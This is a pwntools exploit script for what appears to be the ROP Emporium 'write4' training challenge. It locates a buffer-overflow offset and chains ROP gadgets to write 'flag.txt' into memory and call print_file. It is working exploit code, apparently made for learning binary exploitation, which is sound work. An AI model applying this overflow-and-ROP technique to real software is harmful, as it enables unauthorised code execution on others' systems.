from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './write4'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(200))

# Start program
io = start()

# Address of the .data section
data_section_address = 0x0000000000601028

# We will pop address of .data section into r14
# Then pop the string (flag.txt) into r15
pop_r14_r15_gadget = 0x0000000000400690 # pop r14; pop r15; ret;

# We will then move the string from r15 (flag.txt) into memory location stored in r14
move_r15_r15_gadget = 0x0000000000400628 # mov QWORD PTR [r14],r15

# Needed at the end to get the flag.txt into RDI where it will be used as param to print_file
pop_rdi_gadget = 0x0000000000400693 # pop rdi; ret;


# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x0000000000400620

# Ret gadget for stack alignment
ret_gadget = 0x00000000004004e6

# Print out the imporant addresses:
info("%#x data_section_address", data_section_address)
info("%#x pop_r14_r15_gadget", pop_r14_r15_gadget)
info("%#x move_r15_r15_gadget", move_r15_r15_gadget)
info("%#x print_file", print_file)

payload = flat(
    asm('nop')*offset, # offset
    ret_gadget, # stack alignment
    pop_r14_r15_gadget, # pop .data (1) location into r14 and 4 byte string (2) to r15
    data_section_address, # 1
    'flag.txt', # 2 - Note we can do 8 bytes as 64 bit
    move_r15_r15_gadget, # move string (2) to memory location (1) stored in r14

    # pop the data address to RDI
    pop_rdi_gadget,
    data_section_address, 
    print_file,
)

# Build the payload
# payload = flat({
#     offset: [
#         pop_rdi,  # Pop the next value to RDI
#         0xdeadbeefdeadbeef,
#         pop_rsi_r15,  # Pop the next value to RSI (and junk into R15)
#         0xc0debabec0debabe,
#         0x0,
#         # With params in correct registers, call hacked function
#         elf.functions.hacked
#     ]
# })

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Get flag
io.interactive()